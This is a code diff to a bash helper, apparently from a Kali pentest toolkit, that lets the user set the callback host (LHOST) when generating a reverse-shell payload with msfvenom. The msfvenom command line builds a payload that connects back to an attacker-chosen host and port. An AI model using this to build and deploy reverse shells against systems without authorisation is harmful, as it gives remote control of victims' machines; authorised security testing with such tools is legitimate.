@@ -7,15 +7,17 @@ create_reverse_shell() {
     local LPORT="${4:-1337}"
 
     # Generate GUI form items (label, type (optional: default text), name, default (optional))
-    LPORT_FIELD=$(form_item  "LPORT" "number" "LPORT" "${LPORT}")
+    LHOST_FIELD=$(form_item  "LHOST" "number" "lhost" "${KALI_IP}")
+    LPORT_FIELD=$(form_item  "LPORT" "number" "lport" "${LPORT}")
     FILENAME_FIELD=$(form_item  "filename" "text" "filename" "${FILENAME}")
 
     # Generate GUI form
-    generate_form "${LPORT_FIELD}" "${FILENAME_FIELD}" 
+    generate_form "${LHOST_FIELD}" "${LPORT_FIELD}" "${FILENAME_FIELD}" 
 
-    LPORT=${form_data["LPORT"]}
+    LHOST=${form_data["lhost"]}
+    LPORT=${form_data["lport"]}
     FILENAME=${form_data["filename"]}
 
-    execute_command "msfvenom -p ${PAYLOAD} LHOST=${KALI_IP} LPORT=${LPORT} -f ${FORMAT} -o ${FILENAME}"
+    execute_command "msfvenom -p ${PAYLOAD} LHOST=${LHOST} LPORT=${LPORT} -f ${FORMAT} -o ${FILENAME}"
     create_new_line
 }
